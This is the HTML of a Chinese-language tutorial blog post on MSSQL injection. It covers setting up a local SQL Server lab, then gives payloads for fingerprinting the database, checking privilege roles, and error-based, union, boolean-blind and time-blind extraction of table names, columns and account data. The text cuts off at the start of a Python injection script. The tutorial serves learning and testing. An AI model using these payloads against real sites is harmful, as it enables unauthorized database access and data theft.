<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>MSSQL注入攻击总结 | jmx0hxq's blog</title><meta name="author" content="Jmx0hxq"><meta name="copyright" content="Jmx0hxq"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="sqlserver是微软的SQLServer,也叫MSSQL,一个关系型数据库 环境搭建下载Sqlserver的Developer版本: https:&#x2F;&#x2F;www.microsoft.com&#x2F;zh-cn&#x2F;sql-server&#x2F;sql-server-downloads选定安装位置后在弹出的SQL Server安装中心里选择全新SQL Server独立安装或向现有安装添加功能 然后根据引导安装即可,安装">
<meta property="og:type" content="article">
<meta property="og:title" content="MSSQL注入攻击总结">
<meta property="og:url" content="http://example.com/2025/01/07/sqlserver%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/index.html">
<meta property="og:site_name" content="jmx0hxq&#39;s blog">
<meta property="og:description" content="sqlserver是微软的SQLServer,也叫MSSQL,一个关系型数据库 环境搭建下载Sqlserver的Developer版本: https:&#x2F;&#x2F;www.microsoft.com&#x2F;zh-cn&#x2F;sql-server&#x2F;sql-server-downloads选定安装位置后在弹出的SQL Server安装中心里选择全新SQL Server独立安装或向现有安装添加功能 然后根据引导安装即可,安装">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="http://example.com/assets/images/4.jpg">
<meta property="article:published_time" content="2025-01-07T12:43:37.814Z">
<meta property="article:modified_time" content="2025-01-07T12:49:35.937Z">
<meta property="article:author" content="Jmx0hxq">
<meta property="article:tag" content="学习">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="http://example.com/assets/images/4.jpg"><link rel="shortcut icon" href="/assets/favicon.png"><link rel="canonical" href="http://example.com/2025/01/07/sqlserver%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css?v=4.12.0"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.5.1/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.32/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
  root: '/',
  algolia: undefined,
  localSearch: {"path":"/search.xml","preload":false,"top_n_per_article":1,"unescape":false,"languages":{"hits_empty":"找不到您查询的内容：${query}","hits_stats":"共找到 ${hits} 篇文章"}},
  translate: undefined,
  noticeOutdate: undefined,
  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":800},
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '',
  dateSuffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: undefined,
  lightbox: 'fancybox',
  Snackbar: undefined,
  infinitegrid: {
    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.11.0/dist/infinitegrid.min.js',
    buttonText: '加载更多'
  },
  isPhotoFigcaption: false,
  islazyload: false,
  isAnchor: false,
  percent: {
    toc: true,
    rightside: false,
  },
  autoDarkmode: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: 'MSSQL注入攻击总结',
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  postUpdate: '2025-01-07 20:49:35'
}</script><script>(win=>{
      win.saveToLocal = {
        set: (key, value, ttl) => {
          if (ttl === 0) return
          const now = Date.now()
          const expiry = now + ttl * 86400000
          const item = {
            value,
            expiry
          }
          localStorage.setItem(key, JSON.stringify(item))
        },
      
        get: key => {
          const itemStr = localStorage.getItem(key)
      
          if (!itemStr) {
            return undefined
          }
          const item = JSON.parse(itemStr)
          const now = Date.now()
      
          if (now > item.expiry) {
            localStorage.removeItem(key)
            return undefined
          }
          return item.value
        }
      }
    
      win.getScript = (url, attr = {}) => new Promise((resolve, reject) => {
        const script = document.createElement('script')
        script.src = url
        script.async = true
        script.onerror = reject
        script.onload = script.onreadystatechange = function() {
          const loadState = this.readyState
          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
          script.onload = script.onreadystatechange = null
          resolve()
        }

        Object.keys(attr).forEach(key => {
          script.setAttribute(key, attr[key])
        })

        document.head.appendChild(script)
      })
    
      win.getCSS = (url, id = false) => new Promise((resolve, reject) => {
        const link = document.createElement('link')
        link.rel = 'stylesheet'
        link.href = url
        if (id) link.id = id
        link.onerror = reject
        link.onload = link.onreadystatechange = function() {
          const loadState = this.readyState
          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
          link.onload = link.onreadystatechange = null
          resolve()
        }
        document.head.appendChild(link)
      })
    
      win.activateDarkMode = () => {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      win.activateLightMode = () => {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }
      const t = saveToLocal.get('theme')
    
        if (t === 'dark') activateDarkMode()
        else if (t === 'light') activateLightMode()
      
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    
      const detectApple = () => {
        if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
          document.documentElement.classList.add('apple')
        }
      }
      detectApple()
    })(window)</script><meta name="generator" content="Hexo 7.1.1"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/jmx0hxq.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">47</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">10</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">9</div></a></div><hr class="custom-hr"/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> List</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> Music</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> Movie</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('/assets/images/4.jpg')"><nav id="nav"><span id="blog-info"><a href="/" title="jmx0hxq's blog"><span class="site-name">jmx0hxq's blog</span></a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search" href="javascript:void(0);"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> List</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> Music</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> Movie</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">MSSQL注入攻击总结</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2025-01-07T12:43:37.814Z" title="发表于 2025-01-07 20:43:37">2025-01-07</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2025-01-07T12:49:35.937Z" title="更新于 2025-01-07 20:49:35">2025-01-07</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E5%AD%A6%E4%B9%A0/">学习</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">2.7k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>13分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="MSSQL注入攻击总结"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><p>sqlserver是微软的SQLServer,也叫MSSQL,一个关系型数据库</p>
<h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><p>下载Sqlserver的Developer版本: <strong><a target="_blank" rel="noopener" href="https://www.microsoft.com/zh-cn/sql-server/sql-server-downloads">https://www.microsoft.com/zh-cn/sql-server/sql-server-downloads</a></strong><br>选定安装位置后在弹出的SQL Server安装中心里选择全新SQL Server独立安装或向现有安装添加功能<br><img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/20250104220051.png" alt="image.png"></p>
<p>然后根据引导安装即可,安装成功后打开SQL Server配置管理器,讲TCP/IP启用<br><img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/20250104220234.png" alt="image.png"></p>
<p>下载SSMS: <a target="_blank" rel="noopener" href="https://learn.microsoft.com/zh-cn/sql/ssms/download-sql-server-management-studio-ssms?redirectedfrom=MSDN&amp;view=sql-server-ver16">https://learn.microsoft.com/zh-cn/sql/ssms/download-sql-server-management-studio-ssms?redirectedfrom=MSDN&amp;view=sql-server-ver16</a></p>
<p>打开新建连接,选择刚才安装MSSQL的本地服务器,身份验证选择Windows 身份验证<br><img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/20250104220333.png" alt="image.png"></p>
<p>进去之后设置sa用户的密码<br><img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/20250104220446.png" alt="image.png"><br>然后开启sa用户的启用<br><img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/20250104220506.png" alt="image.png"></p>
<p>右键服务器-&gt;属性-&gt;安全性<br>服务器身份验证模式选择第二个SQL Server和Windows身份验证模式<br><img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/20250104220532.png" alt="image.png"></p>
<p>打开Navicat,使用sa用户连接本地的MSSQL服务器<br><img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/20250104220641.png" alt="image.png"></p>
<h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><p>判断数据库类型：</p>
<ol>
<li><p>sysobjects是MSSQL数据库中独有的数据表</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1 and (select count(*) from sysobjects)&gt;0 --</span><br></pre></td></tr></table></figure>
<p>如果返回正常即为MSSQL数据库</p>
</li>
<li><p>通过 MSSQL 数据库中特有的延时函数进行判断</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1;WAITFOR DELAY &#x27;00:00:10&#x27;; -- </span><br></pre></td></tr></table></figure>
</li>
</ol>
<p>查询数据库版本<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1 and 1=(select @@version) --</span><br></pre></td></tr></table></figure></p>
<p>查询当前数据库用户名<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1 and user&gt;0;--</span><br></pre></td></tr></table></figure></p>
<p>查询当前数据库名<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1 and db_name()&gt;0;--</span><br></pre></td></tr></table></figure></p>
<p>判断字段个数<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1 order by 6--</span><br></pre></td></tr></table></figure></p>
<p>查询本地服务名<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1 and 1=(select @@servername)--</span><br></pre></td></tr></table></figure></p>
<p>是否站库分离<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1 and ((select host_name())=(select @@servername))--</span><br></pre></td></tr></table></figure></p>
<p>判断当前服务器级别角色<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">?id=1 and 1=(select is_srvrolemember(&#x27;sysadmin&#x27;))--</span><br><span class="line">?id=1 and 1=(select is_srvrolemember(&#x27;serveradmin&#x27;))--</span><br><span class="line">?id=1 and 1=(select is_srvrolemember(&#x27;securityadmin&#x27;))--</span><br><span class="line">?id=1 and 1=(select is_srvrolemember(&#x27;processadmin&#x27;))--</span><br><span class="line">?id=1 and 1=(select is_srvrolemember(&#x27;setupadmin&#x27;))--</span><br><span class="line">?id=1 and 1=(select is_srvrolemember(&#x27;bulkadmin&#x27;))--</span><br><span class="line">?id=1 and 1=(select is_srvrolemember(&#x27;diskadmin&#x27;))--</span><br><span class="line">?id=1 and 1=(select is_srvrolemember(&#x27;dbcreator&#x27;))--</span><br><span class="line">?id=1 and 1=(select is_srvrolemember(&#x27;public&#x27;))--</span><br></pre></td></tr></table></figure></p>
<p>判断当前数据库级别角色<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">?id=1 and 1=(select IS_ROLEMEMBER(&#x27;db_owner&#x27;))--</span><br><span class="line">?id=1 and 1=(select IS_ROLEMEMBER(&#x27;db_securityadmin&#x27;))--</span><br><span class="line">?id=1 and 1=(select IS_ROLEMEMBER(&#x27;db_accessadmin&#x27;))--</span><br><span class="line">?id=1 and 1=(select IS_ROLEMEMBER(&#x27;db_backupoperator&#x27;))--</span><br><span class="line">?id=1 and 1=(select IS_ROLEMEMBER(&#x27;db_ddladmin&#x27;))--</span><br><span class="line">?id=1 and 1=(select IS_ROLEMEMBER(&#x27;db_datawriter&#x27;))--</span><br><span class="line">?id=1 and 1=(select IS_ROLEMEMBER(&#x27;db_datareader&#x27;))--</span><br><span class="line">?id=1 and 1=(select IS_ROLEMEMBER(&#x27;db_denydatawriter&#x27;))--</span><br></pre></td></tr></table></figure></p>
<h1 id="注入"><a href="#注入" class="headerlink" title="注入"></a>注入</h1><h2 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h2><p>MSSQL 数据库是强类型语言数据库，当类型不一致时将会报错，配合子查询即可实现报错注入。前提是服务器允许返回报错信息。<br>查表名:<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="operator">/</span><span class="operator">/</span>这里可以查出一个表名</span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span>(<span class="keyword">select</span> top <span class="number">1</span> name <span class="keyword">from</span> sysobjects <span class="keyword">where</span> xtype<span class="operator">=</span><span class="string">&#x27;u&#x27;</span>);<span class="comment">--</span></span><br><span class="line"><span class="operator">/</span><span class="operator">/</span>假设上面查出了fsb_accounts表,通过<span class="keyword">not</span> <span class="keyword">in</span>语句来显示下一个表</span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span>(<span class="keyword">select</span> top <span class="number">1</span> name <span class="keyword">from</span> sysobjects <span class="keyword">where</span> xtype<span class="operator">=</span><span class="string">&#x27;u&#x27;</span> <span class="keyword">and</span> name <span class="keyword">not</span> <span class="keyword">in</span> (<span class="string">&#x27;fsb_accounts&#x27;</span>));<span class="comment">--</span></span><br><span class="line"><span class="operator">/</span><span class="operator">/</span>依次类推通过<span class="keyword">not</span> <span class="keyword">in</span>来显示剩下的表</span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span>(<span class="keyword">select</span> top <span class="number">1</span> name <span class="keyword">from</span> sysobjects <span class="keyword">where</span> xtype<span class="operator">=</span><span class="string">&#x27;u&#x27;</span> <span class="keyword">and</span> name <span class="keyword">not</span> <span class="keyword">in</span> (<span class="string">&#x27;fsb_accounts&#x27;</span>, <span class="string">&#x27;fsb_fund_transfers&#x27;</span>));<span class="comment">--</span></span><br><span class="line"></span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span>(<span class="keyword">select</span> top <span class="number">1</span> name <span class="keyword">from</span> sysobjects <span class="keyword">where</span> xtype<span class="operator">=</span><span class="string">&#x27;u&#x27;</span> <span class="keyword">and</span> name <span class="keyword">not</span> <span class="keyword">in</span> (<span class="string">&#x27;fsb_accounts&#x27;</span>, <span class="string">&#x27;fsb_fund_transfers&#x27;</span>, <span class="string">&#x27;fsb_loan_rates&#x27;</span>));<span class="comment">--</span></span><br><span class="line"></span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span>(<span class="keyword">select</span> top <span class="number">1</span> name <span class="keyword">from</span> sysobjects <span class="keyword">where</span> xtype<span class="operator">=</span><span class="string">&#x27;u&#x27;</span> <span class="keyword">and</span> name <span class="keyword">not</span> <span class="keyword">in</span> (<span class="string">&#x27;fsb_accounts&#x27;</span>, <span class="string">&#x27;fsb_fund_transfers&#x27;</span>, <span class="string">&#x27;fsb_loan_rates&#x27;</span>, <span class="string">&#x27;fsb_messages&#x27;</span>));<span class="comment">--</span></span><br><span class="line"></span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span>(<span class="keyword">select</span> top <span class="number">1</span> name <span class="keyword">from</span> sysobjects <span class="keyword">where</span> xtype<span class="operator">=</span><span class="string">&#x27;u&#x27;</span> <span class="keyword">and</span> name <span class="keyword">not</span> <span class="keyword">in</span> (<span class="string">&#x27;fsb_accounts&#x27;</span>, <span class="string">&#x27;fsb_fund_transfers&#x27;</span>, <span class="string">&#x27;fsb_loan_rates&#x27;</span>, <span class="string">&#x27;fsb_messages&#x27;</span>, <span class="string">&#x27;fsb_transactions&#x27;</span>));<span class="comment">--</span></span><br><span class="line"></span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span>(<span class="keyword">select</span> top <span class="number">1</span> name <span class="keyword">from</span> sysobjects <span class="keyword">where</span> xtype<span class="operator">=</span><span class="string">&#x27;u&#x27;</span> <span class="keyword">and</span> name <span class="keyword">not</span> <span class="keyword">in</span> (<span class="string">&#x27;fsb_accounts&#x27;</span>, <span class="string">&#x27;fsb_fund_transfers&#x27;</span>, <span class="string">&#x27;fsb_loan_rates&#x27;</span>, <span class="string">&#x27;fsb_messages&#x27;</span>, <span class="string">&#x27;fsb_transactions&#x27;</span>, <span class="string">&#x27;fsb_users&#x27;</span>));<span class="comment">--</span></span><br></pre></td></tr></table></figure></p>
<p>查字段名:<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span>(<span class="keyword">select</span> top <span class="number">1</span> name <span class="keyword">from</span> syscolumns <span class="keyword">where</span> id<span class="operator">=</span>(<span class="keyword">select</span> id <span class="keyword">from</span> sysobjects <span class="keyword">where</span> name <span class="operator">=</span> <span class="string">&#x27;fsb_accounts&#x27;</span>));<span class="comment">--</span></span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span>(<span class="keyword">select</span> top <span class="number">1</span> name <span class="keyword">from</span> syscolumns <span class="keyword">where</span> id<span class="operator">=</span>(<span class="keyword">select</span> id <span class="keyword">from</span> sysobjects <span class="keyword">where</span> name <span class="operator">=</span> <span class="string">&#x27;fsb_accounts&#x27;</span>) <span class="keyword">and</span> name<span class="operator">&lt;&gt;</span><span class="string">&#x27;account_no&#x27;</span>);<span class="comment">--</span></span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span>(<span class="keyword">select</span> top <span class="number">1</span> name <span class="keyword">from</span> syscolumns <span class="keyword">where</span> id<span class="operator">=</span>(<span class="keyword">select</span> id <span class="keyword">from</span> sysobjects <span class="keyword">where</span> name <span class="operator">=</span> <span class="string">&#x27;fsb_accounts&#x27;</span>) <span class="keyword">and</span> name<span class="operator">&lt;&gt;</span><span class="string">&#x27;account_no&#x27;</span> <span class="keyword">and</span> name<span class="operator">&lt;&gt;</span><span class="string">&#x27;account_type&#x27;</span>);<span class="comment">--</span></span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span>(<span class="keyword">select</span> top <span class="number">1</span> name <span class="keyword">from</span> syscolumns <span class="keyword">where</span> id<span class="operator">=</span>(<span class="keyword">select</span> id <span class="keyword">from</span> sysobjects <span class="keyword">where</span> name <span class="operator">=</span> <span class="string">&#x27;fsb_accounts&#x27;</span>) <span class="keyword">and</span> name<span class="operator">&lt;&gt;</span><span class="string">&#x27;account_no&#x27;</span> <span class="keyword">and</span> name<span class="operator">&lt;&gt;</span><span class="string">&#x27;account_type&#x27;</span> <span class="keyword">and</span> name<span class="operator">&lt;&gt;</span><span class="string">&#x27;balance_amount&#x27;</span>);<span class="comment">--</span></span><br></pre></td></tr></table></figure></p>
<p>==注意在MSSQL中除了借助sysobjects和syscolumns表来获取表名和列名外,它也兼容information_schema==<br>eg<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span>(<span class="keyword">select</span> top <span class="number">1</span> table_name <span class="keyword">from</span> information_schema.tables);<span class="comment">--</span></span><br></pre></td></tr></table></figure></p>
<p>查询具体数据<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span>(<span class="keyword">select</span> top <span class="number">1</span> branch <span class="keyword">from</span> fsb_accounts);<span class="comment">--</span></span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span>(<span class="keyword">select</span> top <span class="number">1</span> branch <span class="keyword">from</span> fsb_accounts <span class="keyword">where</span> branch<span class="operator">&lt;&gt;</span><span class="string">&#x27;Texas-Remington Circle&#x27;</span>);<span class="comment">--</span></span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span>(<span class="keyword">select</span> top <span class="number">1</span> branch <span class="keyword">from</span> fsb_accounts <span class="keyword">where</span> branch <span class="keyword">not</span> <span class="keyword">in</span> (<span class="string">&#x27;Texas-Remington Circle&#x27;</span>, <span class="string">&#x27;Mahnattan - New york&#x27;</span>));<span class="comment">--</span></span><br></pre></td></tr></table></figure></p>
<h2 id="联合查询"><a href="#联合查询" class="headerlink" title="联合查询"></a>联合查询</h2><p>方法和Mysql相同,但是MSSQL!不使用数字当占位符,而是NULL<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="keyword">NULL</span>, <span class="keyword">NULL</span> ,<span class="keyword">NULL</span>, <span class="keyword">NULL</span>, <span class="keyword">NULL</span> <span class="keyword">from</span> fsb_users<span class="comment">--</span></span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="keyword">NULL</span>, user_name, <span class="keyword">NULL</span>, <span class="keyword">NULL</span>, <span class="keyword">NULL</span> <span class="keyword">from</span> fsb_users<span class="comment">--</span></span><br></pre></td></tr></table></figure></p>
<h2 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h2><p>方法与mysql相似<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">-1</span> <span class="keyword">or</span> ascii(<span class="built_in">substring</span>((<span class="keyword">select</span> top <span class="number">1</span> name <span class="keyword">from</span> master.dbo.sysdatabases),<span class="number">1</span>,<span class="number">1</span>))<span class="operator">&gt;</span><span class="number">97</span><span class="comment">--</span></span><br></pre></td></tr></table></figure></p>
<h2 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h2><p>MSSQL的延时是WAITFOR<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span>;if (<span class="keyword">select</span> IS_SRVROLEMEMBER(<span class="string">&#x27;sysadmin&#x27;</span>))<span class="operator">=</span><span class="number">1</span> WAITFOR DELAY <span class="string">&#x27;0:0:2&#x27;</span><span class="comment">--</span></span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span>;if (ascii(<span class="built_in">substring</span>((<span class="keyword">select</span> top <span class="number">1</span> name <span class="keyword">from</span> master.dbo.sysdatabases),<span class="number">1</span>,<span class="number">1</span>)))<span class="operator">&gt;</span><span class="number">1</span> WAITFOR DELAY <span class="string">&#x27;0:0:2&#x27;</span><span class="comment">--</span></span><br></pre></td></tr></table></figure><br>脚本<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span 